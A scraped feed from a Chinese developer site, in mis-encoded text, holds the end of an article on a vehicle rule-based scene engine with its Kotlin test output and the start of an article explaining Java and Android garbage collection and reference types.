<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"start_button"</span>, <span class="hljs-string">"clicked"</span>))
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"å®‰å…¨å¯åŠ¨åœºæ™¯æ˜¯å¦æ¿€æ´»: ${engine.isSceneActive(securitySequenceScene.id)}"</span>)
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"å†æ¬¡åˆ¶åŠ¨è¸æ¿"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"brake_pedal"</span>, <span class="hljs-string">"pressed"</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">2000</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"start_button"</span>, <span class="hljs-string">"clicked"</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">" ============= æµ‹è¯•åœºæ™¯å¼•æ“ end ============"</span>)
</code></pre>
<p>æ‰§è¡Œç»“æœï¼š</p>
<ul>
<li>å…ˆè¸©ä¸‹åˆ¶åŠ¨è¸æ¿ï¼Œç´§æ¥ç€æ¾å¼€åˆ¶åŠ¨è¸æ¿</li>
<li>ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®ï¼Œã€å®‰å…¨å¯åŠ¨æ¨¡å¼ã€‘æœªæ¿€æ´»</li>
<li>å†æ¬¡è¸©ä¸‹åˆ¶åŠ¨è¸æ¿</li>
<li>ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®ï¼Œè‡ªåŠ¨è¿›å…¥ã€å®‰å…¨å¯åŠ¨æ¨¡å¼ã€‘</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">--- æµ‹è¯• 4: å¼€å§‹å®‰å…¨å¯åŠ¨åºåˆ—æµ‹è¯• ---
å…ˆè¸©ä¸‹åˆ¶åŠ¨è¸æ¿
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=brake_pedal, value=pressed)
æ¾å¼€åˆ¶åŠ¨è¸æ¿
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=brake_pedal, value=unpressed)
ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=start_button, value=clicked)
å®‰å…¨å¯åŠ¨åœºæ™¯æ˜¯å¦æ¿€æ´»: false
å†æ¬¡åˆ¶åŠ¨è¸æ¿
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=brake_pedal, value=pressed)
ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=start_button, value=clicked)
ğŸŸ¢ <span class="hljs-section">[åœºæ™¯æ¿€æ´»]</span> å®‰å…¨æ ¡éªŒé€šè¿‡ï¼šåŠ¨åŠ›ç³»ç»Ÿå·²å°±ç»ªï¼
</code></pre>
<h2 data-id="heading-15">äº”ã€æ€»ç»“</h2>
<p>å›é¡¾ä¸€ä¸‹ï¼Œâ€œåœºæ™¯å¼•æ“â€è¿™ä¸ªæ¦‚å¿µå¬èµ·æ¥é¢‡ä¸ºé«˜ç«¯ï¼Œä½†æ‹†å¼€æ¥çœ‹ï¼Œå®ƒçš„æ ¸å¿ƒå…¶å®å°±æ˜¯ä¸€ä¸ªè§„åˆ™å¼•æ“ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬å½“å‰çš„å®ç°ä»…ä»…æ˜¯ä¸€ä¸ªå¼€ç«¯ï¼Œéšç€å¤§æ¨¡å‹çš„é›†æˆå’Œç”¨æˆ·è¡Œä¸ºæ•°æ®çš„æŒç»­ç§¯ç´¯ï¼Œåœºæ™¯å¼•æ“æœ‰æœ›ä»è¢«åŠ¨å“åº”è§„åˆ™æ¼”è¿›åˆ°ä¸»åŠ¨é¢„æµ‹ç”¨æˆ·æ„å›¾ã€‚å¸Œæœ›è¿™ç¯‡åˆ†äº«èƒ½ä¸ºä½ æä¾›ä¸€äº›çµæ„Ÿå’Œæ€è€ƒã€‚</p>
<p>æœ¬æ–‡æºç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flinxu-link%2FVehicleSceneEngine" target="_blank" title="https://github.com/linxu-link/VehicleSceneEngine" ref="nofollow noopener noreferrer">github.com/linxu-link/â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaå†…å­˜å›æ”¶æœºåˆ¶ï¼ˆGCï¼‰å®Œæ•´è¯¦è§£]]></title>    <link>https://juejin.cn/post/7592805973119991814</link>    <guid>https://juejin.cn/post/7592805973119991814</guid>    <pubDate>2026-01-08T08:17:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973119991814" data-draft-id="7592759140037804073" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaå†…å­˜å›æ”¶æœºåˆ¶ï¼ˆGCï¼‰å®Œæ•´è¯¦è§£"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,Java"/> <meta itemprop="datePublished" content="2026-01-08T08:17:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’è²843"/> <meta itemprop="url" content="https://juejin.cn/user/541408646929991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaå†…å­˜å›æ”¶æœºåˆ¶ï¼ˆGCï¼‰å®Œæ•´è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/541408646929991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’è²843
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:17:56.000Z" title="Thu Jan 08 2026 08:17:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1å°æ—¶+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬ä¸€éƒ¨åˆ†ï¼šåƒåœ¾å›æ”¶åŸºç¡€</h2>
<h3 data-id="heading-1">1. åƒåœ¾å›æ”¶åŸºç¡€</h3>
<h4 data-id="heading-2">1.1 ä»€ä¹ˆæ˜¯åƒåœ¾å›æ”¶</h4>
<p><strong>å®šä¹‰ï¼š</strong></p>
<p>åƒåœ¾å›æ”¶ï¼ˆGarbage Collectionï¼ŒGCï¼‰æ˜¯è‡ªåŠ¨ç®¡ç†å†…å­˜çš„æœºåˆ¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«å’Œå›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡ï¼Œé‡Šæ”¾å®ƒä»¬å ç”¨çš„å†…å­˜ç©ºé—´ã€‚</p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ol>
<li><strong>è‡ªåŠ¨é‡Šæ”¾å†…å­˜</strong>ï¼šä¸éœ€è¦å¼€å‘è€…æ‰‹åŠ¨é‡Šæ”¾å†…å­˜ï¼Œé¿å…å¿˜è®°é‡Šæ”¾å¯¼è‡´çš„å†…å­˜æ³„æ¼</li>
<li><strong>é¿å…å†…å­˜æ³„æ¼</strong>ï¼šè‡ªåŠ¨å›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡ï¼Œé˜²æ­¢å†…å­˜é€æ¸è¢«å ç”¨</li>
<li><strong>ç®€åŒ–å†…å­˜ç®¡ç†</strong>ï¼šå¼€å‘è€…åªéœ€è¦å…³æ³¨ä¸šåŠ¡é€»è¾‘ï¼Œä¸éœ€è¦å…³å¿ƒå†…å­˜é‡Šæ”¾</li>
<li><strong>æé«˜å¼€å‘æ•ˆç‡</strong>ï¼šå‡å°‘å†…å­˜ç®¡ç†ç›¸å…³çš„bug</li>
</ol>
<p><strong>Androidä¸­çš„é‡è¦æ€§ï¼š</strong></p>
<ol>
<li><strong>å†…å­˜æœ‰é™</strong>ï¼šAndroidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li><strong>æ€§èƒ½å½±å“</strong>ï¼šGCæ€§èƒ½ç›´æ¥å½±å“åº”ç”¨æµç•…åº¦</li>
<li><strong>ç”¨æˆ·ä½“éªŒ</strong>ï¼šé¢‘ç¹GCä¼šå¯¼è‡´å¡é¡¿ï¼Œå½±å“ç”¨æˆ·ä½“éªŒ</li>
<li><strong>ç³»ç»Ÿç¨³å®šæ€§</strong>ï¼šå†…å­˜ä¸è¶³å¯èƒ½å¯¼è‡´åº”ç”¨è¢«ç³»ç»Ÿæ€æ­»</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GarbageCollectionExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åˆ›å»ºå¯¹è±¡</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
        
        <span class="hljs-comment">// obj1å’Œobj2ä¸å†è¢«å¼•ç”¨åï¼ŒGCä¼šè‡ªåŠ¨å›æ”¶å®ƒä»¬å ç”¨çš„å†…å­˜</span>
        <span class="hljs-comment">// å¼€å‘è€…ä¸éœ€è¦æ‰‹åŠ¨é‡Šæ”¾</span>
    }
}
</code></pre>
<h4 data-id="heading-3">1.2 å¦‚ä½•åˆ¤æ–­å¯¹è±¡å·²æ­»ï¼ˆå“ªäº›å¯¹è±¡å¯ä»¥è¢«å›æ”¶ï¼‰</h4>
<p><strong>æ ¸å¿ƒé—®é¢˜ï¼š</strong> GCéœ€è¦çŸ¥é“å“ªäº›å¯¹è±¡æ˜¯"åƒåœ¾"ï¼ˆä¸å†ä½¿ç”¨ï¼‰ï¼Œå“ªäº›å¯¹è±¡è¿˜åœ¨ä½¿ç”¨ã€‚</p>
<h5 data-id="heading-4">1.2.1 å¼•ç”¨è®¡æ•°ç®—æ³•ï¼ˆAndroidä¸ä½¿ç”¨ï¼Œäº†è§£å³å¯ï¼‰</h5>
<p><strong>åŸç†ï¼š</strong></p>
<p>æ¯ä¸ªå¯¹è±¡æœ‰ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œå½“å¯¹è±¡è¢«å¼•ç”¨æ—¶è®¡æ•°å™¨+1ï¼Œå–æ¶ˆå¼•ç”¨æ—¶è®¡æ•°å™¨-1ã€‚å½“è®¡æ•°å™¨ä¸º0æ—¶ï¼Œå¯¹è±¡å¯ä»¥è¢«å›æ”¶ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¼•ç”¨è®¡æ•° = 1</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> obj;           <span class="hljs-comment">// å¼•ç”¨è®¡æ•° = 2</span>
obj = <span class="hljs-literal">null</span>;                 <span class="hljs-comment">// å¼•ç”¨è®¡æ•° = 1</span>
ref = <span class="hljs-literal">null</span>;                 <span class="hljs-comment">// å¼•ç”¨è®¡æ•° = 0ï¼Œå¯¹è±¡å¯ä»¥è¢«å›æ”¶</span>
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°ç®€å•</li>
<li>å›æ”¶åŠæ—¶ï¼Œå¯¹è±¡ä¸å†è¢«å¼•ç”¨æ—¶ç«‹å³å›æ”¶</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨</strong>ï¼šä¸¤ä¸ªå¯¹è±¡ç›¸äº’å¼•ç”¨ï¼Œå¼•ç”¨è®¡æ•°æ°¸è¿œä¸ä¸º0ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>å¾ªç¯å¼•ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    Node next;
}

<span class="hljs-type">Node</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
<span class="hljs-type">Node</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
node1.next = node2;  <span class="hljs-comment">// node1å¼•ç”¨node2</span>
node2.next = node1;  <span class="hljs-comment">// node2å¼•ç”¨node1</span>

<span class="hljs-comment">// å³ä½¿node1å’Œnode2éƒ½ä¸å†è¢«å¤–éƒ¨å¼•ç”¨</span>
<span class="hljs-comment">// å®ƒä»¬çš„å¼•ç”¨è®¡æ•°éƒ½æ˜¯1ï¼ˆç›¸äº’å¼•ç”¨ï¼‰ï¼Œæ— æ³•è¢«å›æ”¶</span>
<span class="hljs-comment">// è¿™å°±æ˜¯å†…å­˜æ³„æ¼</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆAndroidä¸ç”¨ï¼š</strong></p>
<p>Androidä¸ä½¿ç”¨å¼•ç”¨è®¡æ•°ç®—æ³•ï¼Œå› ä¸ºæ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨ï¼Œä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚Androidä½¿ç”¨å¯è¾¾æ€§åˆ†æç®—æ³•ã€‚</p>
<h5 data-id="heading-5">1.2.2 å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆAndroidä½¿ç”¨è¿™ä¸ªï¼‰</h5>
<p><strong>åŸç†ï¼š</strong></p>
<p>ä»ä¸€ç»„ç§°ä¸º"GC Roots"çš„å¯¹è±¡å¼€å§‹ï¼Œå‘ä¸‹æœç´¢ï¼Œæ‰€æœ‰èƒ½å¤Ÿä»GC Rootsåˆ°è¾¾çš„å¯¹è±¡éƒ½æ˜¯"å­˜æ´»"çš„ï¼Œæ— æ³•åˆ°è¾¾çš„å¯¹è±¡å°±æ˜¯"åƒåœ¾"ï¼Œå¯ä»¥è¢«å›æ”¶ã€‚</p>
<p><strong>ç®—æ³•æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ä»GC Rootså¼€å§‹
<span class="hljs-bullet">2.</span> æ ‡è®°æ‰€æœ‰èƒ½åˆ°è¾¾çš„å¯¹è±¡ï¼ˆå­˜æ´»å¯¹è±¡ï¼‰
<span class="hljs-bullet">3.</span> æœªæ ‡è®°çš„å¯¹è±¡å°±æ˜¯åƒåœ¾ï¼Œå¯ä»¥è¢«å›æ”¶
</code></pre>
<p><strong>GC Rootså¯¹è±¡æœ‰å“ªäº›ï¼ˆAndroidåœºæ™¯ï¼‰ï¼š</strong></p>
<ol>
<li><strong>è™šæ‹Ÿæœºæ ˆä¸­å¼•ç”¨çš„å¯¹è±¡</strong>
<ul>
<li>å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°</li>
<li>ç¤ºä¾‹ï¼šæ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡å¼•ç”¨çš„å¯¹è±¡</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// objåœ¨æ ˆä¸­ï¼Œå¼•ç”¨çš„å¯¹è±¡æ˜¯GC Root</span>
    <span class="hljs-comment">// objå¼•ç”¨çš„å¯¹è±¡ä¸ä¼šè¢«å›æ”¶</span>
}
</code></pre>
<ol start="2">
<li><strong>æ–¹æ³•åŒºä¸­é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡</strong>
<ul>
<li>staticå˜é‡</li>
<li>ç¤ºä¾‹ï¼šç±»çš„é™æ€å˜é‡</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Object</span> <span class="hljs-variable">staticObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// staticObjæ˜¯GC Root</span>
    <span class="hljs-comment">// staticObjå¼•ç”¨çš„å¯¹è±¡ä¸ä¼šè¢«å›æ”¶</span>
}
</code></pre>
<ol start="3">
<li><strong>æ–¹æ³•åŒºä¸­å¸¸é‡å¼•ç”¨çš„å¯¹è±¡</strong>
<ul>
<li>å¸¸é‡</li>
<li>ç¤ºä¾‹ï¼šå­—ç¬¦ä¸²å¸¸é‡</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSTANT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;  <span class="hljs-comment">// CONSTANTæ˜¯GC Root</span>
}
</code></pre>
<ol start="4">
<li>
<p><strong>æœ¬åœ°æ–¹æ³•æ ˆä¸­å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>Nativeæ–¹æ³•ä¸­çš„å¼•ç”¨</li>
<li>ç¤ºä¾‹ï¼šJNIè°ƒç”¨ä¸­çš„å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>åŒæ­¥é”æŒæœ‰çš„å¯¹è±¡</strong></p>
<ul>
<li>synchronizedæŒæœ‰çš„å¯¹è±¡</li>
<li>ç¤ºä¾‹ï¼šé”å¯¹è±¡</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-comment">// lockæ˜¯GC Rootï¼Œä¸ä¼šè¢«å›æ”¶</span>
}
</code></pre>
<ol start="6">
<li><strong>å†…éƒ¨å¼•ç”¨</strong>
<ul>
<li>Classå¯¹è±¡ã€å¼‚å¸¸å¯¹è±¡ç­‰</li>
<li>ç¤ºä¾‹ï¼šç±»çš„Classå¯¹è±¡</li>
</ul>
</li>
</ol>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>èƒ½å¤„ç†å¾ªç¯å¼•ç”¨ï¼Œå‡†ç¡®åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯å›æ”¶</li>
<li>ä¸ä¼šå› ä¸ºå¾ªç¯å¼•ç”¨å¯¼è‡´å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>éœ€è¦æš‚åœåº”ç”¨ï¼ˆSTW - Stop The Worldï¼‰ï¼Œä½†Androidä¼˜åŒ–äº†è¿™ä¸ªé—®é¢˜ï¼Œä½¿ç”¨å¹¶å‘å›æ”¶å‡å°‘æš‚åœæ—¶é—´</li>
</ul>
<p><strong>å¾ªç¯å¼•ç”¨ç¤ºä¾‹ï¼ˆå¯è¾¾æ€§åˆ†æå¯ä»¥å¤„ç†ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    Node next;
}

<span class="hljs-type">Node</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
<span class="hljs-type">Node</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
node1.next = node2;
node2.next = node1;

<span class="hljs-comment">// å¦‚æœnode1å’Œnode2éƒ½ä¸å†è¢«GC Rootså¼•ç”¨</span>
<span class="hljs-comment">// å³ä½¿å®ƒä»¬ç›¸äº’å¼•ç”¨ï¼Œä¹Ÿæ— æ³•ä»GC Rootsåˆ°è¾¾</span>
<span class="hljs-comment">// æ‰€ä»¥å®ƒä»¬éƒ½æ˜¯åƒåœ¾ï¼Œå¯ä»¥è¢«å›æ”¶</span>
</code></pre>
<h5 data-id="heading-6">1.2.3 å¼•ç”¨ç±»å‹ï¼ˆAndroidå¼€å‘ä¸­å¸¸ç”¨ï¼‰</h5>
<p><strong>1. å¼ºå¼•ç”¨ï¼ˆStrong Referenceï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æœ€å¸¸è§çš„å¼•ç”¨ç±»å‹</li>
<li>åªè¦å¼ºå¼•ç”¨å­˜åœ¨ï¼Œå¯¹è±¡å°±ä¸ä¼šè¢«GCå›æ”¶</li>
<li>å³ä½¿å†…å­˜ä¸è¶³ï¼Œä¹Ÿä¸ä¼šå›æ”¶</li>
</ul>
<p><strong>Androidä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>æ™®é€šå¯¹è±¡å¼•ç”¨</li>
<li>Activityå¼•ç”¨</li>
<li>å¤§éƒ¨åˆ†å¯¹è±¡éƒ½æ˜¯å¼ºå¼•ç”¨</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¼ºå¼•ç”¨</span>
<span class="hljs-comment">// objå¼•ç”¨çš„å¯¹è±¡ä¸ä¼šè¢«å›æ”¶ï¼Œé™¤éobj = null</span>
</code></pre>
<p><strong>2. è½¯å¼•ç”¨ï¼ˆSoft Referenceï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å†…å­˜ä¸è¶³æ—¶æ‰å›æ”¶</li>
<li>é€‚åˆç¼“å­˜åœºæ™¯</li>
<li>å¯ä»¥é…åˆå¼•ç”¨é˜Ÿåˆ—ä½¿ç”¨</li>
</ul>
